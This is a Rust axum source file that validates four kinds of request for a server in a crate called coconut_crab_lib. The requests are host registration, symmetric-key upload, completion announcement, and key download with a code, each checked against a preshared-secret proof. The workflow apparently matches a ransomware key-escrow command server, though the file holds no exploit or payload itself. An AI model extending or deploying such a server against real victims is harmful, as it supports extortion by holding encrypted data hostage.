use axum::{
    Json,
    body::Body,
    extract::FromRequest,
    http::{Request, StatusCode},
};
use log::{debug, info, warn};

use crate::{AppState, config};
use coconut_crab_lib::web::{
    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
    validate::{
        check_proof, validate_code, validate_hostname, validate_id, validate_key, validate_proof,
    },
};

#[derive(Debug)]
pub struct Validated<T>(pub T);

impl FromRequest<AppState> for Validated<Registration> {
    type Rejection = (StatusCode, &'static str);

    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
        info!("Received request to register");

        let Json(registration) = match Json::<Registration>::from_request(req, state).await {
            Ok(json) => json,
            Err(error) => {
                warn!("Failed to deserialize registration: {error}");
                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
            }
        };

        if !validate_id(&registration.id) {
            warn!("[] Invalid ID: {}", registration.id);
            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
        }

        if !validate_hostname(&registration.hostname) {
            warn!(
                "[{}] Invalid Hostname: {}",
                registration.id, registration.hostname
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Hostname"));
        }

        if !validate_proof(&registration.proof) {
            warn!(
                "[{}] Invalid Proof: {}",
                registration.id, registration.proof
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
        }

        let proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
        if !check_proof(&proof_source, config::PRESHARED_SECRET, &registration.proof) {
            warn!(
                "[{}] Proof Verification Failure: {}",
                registration.id, registration.proof
            );
            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
        }
        debug!(
            "[{}] Proof Verification Success: {}",
            registration.id, registration.proof
        );

        Ok(Self(registration))
    }
}

impl FromRequest<AppState> for Validated<UploadSymKey> {
    type Rejection = (StatusCode, &'static str);

    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
        info!("Received request to upload symmetric key");

        let Json(uploadsymkey) = match Json::<UploadSymKey>::from_request(req, state).await {
            Ok(json) => json,
            Err(error) => {
                warn!("Failed to deserialize symmetric key upload: {error}");
                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
            }
        };

        if !validate_id(&uploadsymkey.id) {
            warn!("[] Invalid ID: {}", uploadsymkey.id);
            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
        }

        if !validate_key(&uploadsymkey.key) {
            warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
            return Err((StatusCode::BAD_REQUEST, "Invalid Key"));
        }

        if !validate_proof(&uploadsymkey.proof) {
            warn!(
                "[{}] Invalid Proof: {}",
                uploadsymkey.id, uploadsymkey.proof
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
        }

        let proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
        if !check_proof(&proof_source, config::PRESHARED_SECRET, &uploadsymkey.proof) {
            warn!(
                "[{}] Proof Verification Failure: {}",
                uploadsymkey.id, uploadsymkey.proof
            );
            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
        }
        debug!(
            "[{}] Proof Verification Success: {}",
            uploadsymkey.id, uploadsymkey.proof
        );

        Ok(Self(uploadsymkey))
    }
}

impl FromRequest<AppState> for Validated<AnnounceCompletion> {
    type Rejection = (StatusCode, &'static str);

    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
        info!("Received request to announce completion");

        let Json(announcecompletion) =
            match Json::<AnnounceCompletion>::from_request(req, state).await {
                Ok(json) => json,
                Err(error) => {
                    warn!("Failed to deserialize completion announcement: {error}");
                    return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
                }
            };

        if !validate_id(&announcecompletion.id) {
            warn!("[] Invalid ID: {}", announcecompletion.id);
            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
        }

        if !validate_proof(&announcecompletion.proof) {
            warn!(
                "[{}] Invalid Proof: {}",
                announcecompletion.id, announcecompletion.proof
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
        }

        let proof_source = announcecompletion.id.as_bytes().to_vec();
        if !check_proof(
            &proof_source,
            config::PRESHARED_SECRET,
            &announcecompletion.proof,
        ) {
            warn!(
                "[{}] Proof Verification Failure: {}",
                announcecompletion.id, announcecompletion.proof
            );
            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
        }
        debug!(
            "[{}] Proof Verification Success: {}",
            announcecompletion.id, announcecompletion.proof
        );

        Ok(Self(announcecompletion))
    }
}

impl FromRequest<AppState> for Validated<DownloadSymKey> {
    type Rejection = (StatusCode, &'static str);

    async fn from_request(req: Request<Body>, state: &AppState) -> Result<Self, Self::Rejection> {
        info!("Received request to download symmetric key");

        let Json(downloadsymkey) = match Json::<DownloadSymKey>::from_request(req, state).await {
            Ok(json) => json,
            Err(error) => {
                warn!("Failed to deserialize symmetric key download: {error}");
                return Err((StatusCode::BAD_REQUEST, "Invalid JSON"));
            }
        };

        if !validate_id(&downloadsymkey.id) {
            warn!("[] Invalid ID: {}", downloadsymkey.id);
            return Err((StatusCode::BAD_REQUEST, "Invalid ID"));
        }

        if !validate_code(&downloadsymkey.code) {
            warn!(
                "[{}] Invalid Code: {}",
                downloadsymkey.id, downloadsymkey.code
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Code"));
        }

        if !validate_proof(&downloadsymkey.proof) {
            warn!(
                "[{}] Invalid Proof: {}",
                downloadsymkey.id, downloadsymkey.proof
            );
            return Err((StatusCode::BAD_REQUEST, "Invalid Proof"));
        }

        let proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
        if !check_proof(
            &proof_source,
            config::PRESHARED_SECRET,
            &downloadsymkey.proof,
        ) {
            warn!(
                "[{}] Proof Verification Failure: {}",
                downloadsymkey.id, downloadsymkey.proof
            );
            return Err((StatusCode::FORBIDDEN, "Invalid Proof"));
        }
        debug!(
            "[{}] Proof Verification Success: {}",
            downloadsymkey.id, downloadsymkey.proof
        );

        Ok(Self(downloadsymkey))
    }
}
